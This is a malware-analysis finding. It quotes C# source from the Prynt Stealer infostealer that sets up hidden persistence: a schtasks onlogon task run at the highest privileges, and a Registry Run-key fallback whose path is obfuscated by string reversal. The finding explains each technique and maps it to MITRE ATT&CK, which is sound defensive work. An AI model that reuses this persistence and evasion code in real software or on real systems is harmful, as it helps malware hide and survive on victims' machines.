# Finding 1: Prynt Stealer - Scheduled Task Persistence via schtasks

## Metadata
- **Repository**: MalwareSourceCode-main
- **File Path**: `Win32/Stealers/Win32.Prynt/Win32.Prynt/Stub/Stub-Source2/Client.Install/NormalStartup.cs`
- **Language**: C#
- **Malware Family**: Prynt Stealer

## Code Snippet

```csharp
public static void Install()
{
    try
    {
        FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        if (!(fileName != fileInfo.FullName))
        {
            return;
        }
        Process[] processes = Process.GetProcesses();
        foreach (Process process in processes)
        {
            try
            {
                if (process.MainModule.FileName == fileInfo.FullName)
                {
                    process.Kill();
                }
            }
            catch
            {
            }
        }
        if (Methods.IsAdmin())
        {
            // *** SCHEDULED TASK CREATION - LINE 41 ***
            ProcessStartInfo processStartInfo = new ProcessStartInfo();
            processStartInfo.FileName = "cmd";
            processStartInfo.Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit";
            processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            processStartInfo.CreateNoWindow = true;
            Process.Start(processStartInfo);
        }
        else
        {
            using RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree);
            registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), "\"" + fileInfo.FullName + "\"");
        }
        if (File.Exists(fileInfo.FullName))
        {
            File.Delete(fileInfo.FullName);
            Thread.Sleep(1000);
        }
        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
        byte[] array = File.ReadAllBytes(fileName);
        fileStream.Write(array, 0, array.Length);
```

## Analysis

**What it does:**
This code implements persistence for the Prynt Stealer malware by creating a scheduled task that runs at user logon. The malware first copies itself to a designated installation folder, then creates a scheduled task to ensure re-execution.

**How it uses Windows Scheduled Tasks (T1053.005):**
- Uses `schtasks.exe /create` command via cmd.exe
- Schedule trigger: `/sc onlogon` - executes whenever any user logs on
- Privilege level: `/rl highest` - runs with highest available privileges
- Task name: Uses the filename without extension as the task name
- Target: Points to the malware's installation path
- Force flag: `/f` forces creation even if task already exists

**Evasion/Stealth Techniques:**
1. **Dual persistence**: If running as admin, uses scheduled tasks; otherwise falls back to registry Run key
2. **Hidden execution**: Sets `CreateNoWindow = true` and `WindowStyle.Hidden` to avoid user visibility
3. **Process killing**: Terminates any existing instances before installing
4. **Dynamic task naming**: Uses the executable filename as task name, which could appear benign if the file is named appropriately

**MITRE ATT&CK Mapping:**
- **T1053.005**: Scheduled Task/Job: Scheduled Task (Primary)
- **T1547.001**: Boot or Logon Autostart Execution: Registry Run Keys (Fallback)
- **T1036**: Masquerading (via benign-looking filenames)
